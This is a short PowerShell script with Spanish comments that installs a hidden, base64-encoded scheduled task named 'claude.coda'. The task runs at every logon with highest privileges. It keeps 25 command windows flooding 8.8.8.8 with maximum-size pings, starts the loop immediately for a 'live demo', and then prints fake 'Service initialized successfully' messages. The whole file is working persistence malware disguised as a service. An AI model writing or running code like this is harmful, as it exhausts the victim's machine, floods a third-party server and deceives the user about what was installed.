$TaskName = "claude.coda"

# --- Watcher: mantiene 25 cmd con ping abiertos ---
$watcher = @'
while ($true) {
    try {
        $running = (Get-Process cmd -ErrorAction SilentlyContinue).Count
        while ($running -lt 25) {
            Start-Process cmd -ArgumentList '/c ping -t -l 65500 8.8.8.8' -WindowStyle Normal
            $running++
        }
    } catch {}
    Start-Sleep -Seconds 1
}
'@

$bytes   = [System.Text.Encoding]::Unicode.GetBytes($watcher)
$encoded = [Convert]::ToBase64String($bytes)

$Action = New-ScheduledTaskAction `
    -Execute "powershell.exe" `
    -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encoded"

$Trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME

$Settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -Hidden `
    -ExecutionTimeLimit ([TimeSpan]::Zero)

$Principal = New-ScheduledTaskPrincipal `
    -UserId $env:USERNAME `
    -LogonType Interactive `
    -RunLevel Highest

Register-ScheduledTask `
    -TaskName $TaskName `
    -Action $Action `
    -Trigger $Trigger `
    -Settings $Settings `
    -Principal $Principal `
    -Force | Out-Null

# --- Lanzar el watcher ya mismo para la demo en vivo ---
Start-Process powershell.exe `
    -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encoded" `
    -WindowStyle Hidden

Write-Host ""
Write-Host "Service initialized successfully." -ForegroundColor Green
Write-Host "Component: $TaskName" -ForegroundColor Gray
Write-Host "Status: running" -ForegroundColor Gray
Write-Host ""
Start-Sleep -Seconds 2
Write-Host "Configuration completed." -ForegroundColor Green
Write-Host ""
